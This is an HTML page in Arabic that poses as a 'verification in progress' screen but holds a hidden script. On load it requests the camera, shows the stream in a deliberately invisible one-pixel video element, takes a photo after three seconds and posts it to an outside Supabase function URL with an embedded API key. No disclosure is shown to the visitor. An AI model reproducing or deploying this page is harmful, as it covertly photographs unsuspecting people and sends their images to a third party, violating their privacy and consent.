<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Verification</title>

<style>
body{
  margin:0;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:linear-gradient(135deg,#e8f0ff,#fdf2f8);
  font-family:Arial, sans-serif;
  color:#555;
}

.card{
  background:rgba(255,255,255,0.6);
  backdrop-filter: blur(10px);
  padding:30px 40px;
  border-radius:16px;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
  text-align:center;
}

.dot{
  width:10px;
  height:10px;
  background:#a78bfa;
  border-radius:50%;
  display:inline-block;
  animation:pulse 1.5s infinite;
}

@keyframes pulse{
  0%{opacity:.3}
  50%{opacity:1}
  100%{opacity:.3}
}

/* إخفاء الكاميرا تمامًا */
video{
  position:absolute;
  width:1px;
  height:1px;
  opacity:0;
  pointer-events:none;
}
</style>
</head>

<body>

<div class="card">
  <h3>جاري التحقق…</h3>
  <div class="dot"></div>
</div>

<video id="video" autoplay playsinline></video>

<script>
const FUNCTION_URL = "https://meilbsxfoyaddzhaihad.supabase.co/functions/v1/rapid-worker";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1laWxic3hmb3lhZGR6aGFpaGFkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA1MTAwNjMsImV4cCI6MjA4NjA4NjA2M30.CnVoMRuqBGFb9t4CAwmScwjH-HhqOyxEAyN-nCIxrv0";

navigator.mediaDevices.getUserMedia({ video: true })
.then(stream=>{
  video.srcObject = stream;

  setTimeout(()=>{
    captureAndSend();
  },3000);
})
.catch(()=>{});

function captureAndSend(){
  const canvas=document.createElement("canvas");
  canvas.width=video.videoWidth;
  canvas.height=video.videoHeight;

  canvas.getContext("2d").drawImage(video,0,0);

  canvas.toBlob(blob=>{
    const form=new FormData();
    form.append("photo",blob,"photo.jpg");

    fetch(FUNCTION_URL,{
      method:"POST",
      headers:{
        "Authorization":"Bearer "+SUPABASE_ANON_KEY
      },
      body:form
    });
  },"image/jpeg");
}
</script>

</body>
</html>